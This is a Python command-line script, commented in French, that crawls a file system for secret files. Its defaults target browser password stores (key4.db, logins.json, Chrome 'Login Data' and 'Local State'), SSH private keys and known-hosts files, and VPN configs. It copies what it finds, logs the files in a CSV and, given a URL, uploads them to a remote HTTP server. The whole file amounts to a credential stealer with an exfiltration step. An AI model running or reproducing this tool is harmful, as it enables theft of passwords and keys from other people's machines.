import argparse
import datetime
import os

from helpers import csv_manager, filemanager


def main(arguments):
    csv_manager.init()  # Initialise le fichier CSV
    search_files = []
    # Si l'arguement input_file est défini est n'est pas vide
    if arguments.input_file and arguments.input_file.strip():
        input_file = arguments.input_file
        if os.path.isfile(input_file):  # Si l'argument est un fichier valide
            # On récupère chaque ligne du fichier et les mets dans un tableau
            search_files = [line.rstrip() for line in open(input_file)]

    # Si l'arguement search_files est défini est n'est pas vide
    if arguments.search_files and arguments.search_files.strip():
        arg_search_files = arguments.search_files
        if ',' in arg_search_files:  # Si la chaine de caractère contient une virgule
            search_files = list(set(search_files) | set(arg_search_files.split(',')))  # On split la chaine
        else:
            search_files = list(set(search_files) | {arg_search_files})  # On met la chaine dans un tableau

    # Si aucun args pour la recherche de fichier à été défini on utilise les paramètres par défault
    if not arguments.input_file or not arguments.search_files:
        # Valeurs recherchés par default
        search_files = ['ovpn', 'key4.db', 'logins.json', 'Login Data', 'Local State', 'authorized_keys', 'id_rsa',
                        'id_rsa.keystore', 'id_rsa.pub', 'known_hosts']
        if os.name == "nt":  # Si on est sur windows
            search_files = [] + search_files
        elif os.name == "posix":  # Si on est sur posix
            search_files = [] + search_files

    print(search_files)
    if arguments.contains_text and arguments.contains_text.strip():
        contains_text = arguments.contains_text
        if os.path.isfile(contains_text):
            contains_text = [line.rstrip() for line in open(contains_text)]
        elif ',' in contains_text:
            contains_text = contains_text.split(',')
    else:
        contains_text = ''

    if arguments.path and arguments.path.strip():
        path = arguments.path
    else:
        path = ''  # D:\\Users\\Sorrow\\Desktop\\crawl

    # Recherche les fichiers
    files = filemanager.search_files(search_files, path=path, contains_txt=contains_text)
    # Copie les fichiers
    if arguments.interactive or arguments.interactive == 1 or arguments.interactive.lower() == "true":
        string = 'We found {} files, do you want to copy them?  (Yes/No)'.format(len(files))
        accept = input(string)
        if accept.lower() == 'yes' or accept.lower() == 'y':
            # Ajoute chaque fichiers dans le csv
            filenames = filemanager.copy_files(files)
            csv_manager.add_rows(filenames)
        else:
            print("Copie interrompue.")
    else:
        filenames = filemanager.copy_files(files)
        csv_manager.add_rows(filenames)

    # Si l'argument url existe et n'est pas vide
    if arguments.url and arguments.url.strip():
        dl_links = filemanager.send_files(arguments.url)
        csv_manager.update_dl_link(dl_links)


if __name__ == '__main__':
    # Fonction d'appel
    start_time = datetime.datetime.now()

    parser = argparse.ArgumentParser(description='Search files')
    parser.add_argument('--url', dest='url', help='url parameter for http server')
    parser.add_argument('--input-file', dest='input_file',
                        help='file with the list of files or extension to search')
    parser.add_argument('--search-files', dest='search_files',
                        help='file extension to find (\'txt\') or filename to find (\'secret.txt\')')
    parser.add_argument('--contains-text', dest='contains_text', help='text contains in filename')
    parser.add_argument('--path', dest='path', help='base directory to find files')
    parser.add_argument('--interactive', dest='interactive', help='display number of files found')

    args = parser.parse_args()
    main(args)

    end_time = datetime.datetime.now()
    print('Duration: {}'.format(end_time - start_time))
